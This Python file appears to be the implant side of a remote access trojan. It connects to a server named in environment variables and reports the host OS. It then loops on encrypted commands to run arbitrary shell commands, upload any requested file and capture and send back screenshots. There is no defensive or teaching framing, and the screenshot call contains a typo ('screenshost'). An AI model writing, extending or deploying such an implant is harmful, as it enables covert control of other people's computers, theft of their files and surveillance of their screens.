import os.path
from time import sleep
from datetime import datetime

from listener.communication import Communication
from listener.cipher import Cipher
from tools.env import EnvReader
import json
import platform
import subprocess
import pyautogui


def main():
    env = EnvReader()
    listener = Communication(
        host=env.get('SERVER_ADDR').encode('utf-8'),
        port=int(env.get('SERVER_PORT'))
    )
    cipher = Cipher(
        key=env.get("CRYPTO_KEY").encode('utf-8'),
        iv=env.get("CRYPTO_IV").encode('utf-8')
    )

    system_os = platform.system()

    listener.init_send(json.dumps({
        "type": "init",
        "action": "setup done",
        "params": system_os
    }).encode('utf-8'))

    sleep(2)

    listener.init_listen()

    print('Listening on port 8888...')
    while True:
        listen = listener.listen()
        conn = listen["conn"]
        data = cipher.decrypt_message(listen["data"])
        data = json.loads(data)

        if data is not None:
            print(data)
            if data['type'] == "command":

                command = data['action']
                result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

                response = json.dumps({
                    'status': 'OK',
                    'response': result.stdout
                }).encode('utf-8')

                print(response)

                conn.sendall(cipher.encrypt_message(response))

            elif data['type'] == "download":
                if not os.path.exists(data['action']):
                    response = json.dumps({
                        'status': 'NOK',
                        'response': 'File not found'
                    }).encode('utf-8')
                else:
                    file = open(data['action'], "rb")
                    response = file.read()
                    file.close()
                conn.sendall(cipher.encrypt_message(response))

            elif data['type'] == "screenshot":
                now = datetime.now()
                date = now.strftime("%d%m_%H%M")
                filename = f"./screenshot/screen_{date}.png"

                screenshot = pyautogui.screenshost()
                screenshot.save(filename)

                if not os.path.exists(filename):
                    response = json.dumps({
                        'status': 'NOK',
                        'response': 'File not found'
                    }).encode('utf-8')
                else:
                    file = open(filename, "rb")
                    response = file.read()
                    file.close()
                conn.sendall(cipher.encrypt_message(response))

            else:
                response = json.dumps({
                    'status': 'NOK',
                    'response': 'Unknown action'
                }).encode('utf-8')
                conn.sendall(cipher.encrypt_message(response))



if __name__ == '__main__':
    main()
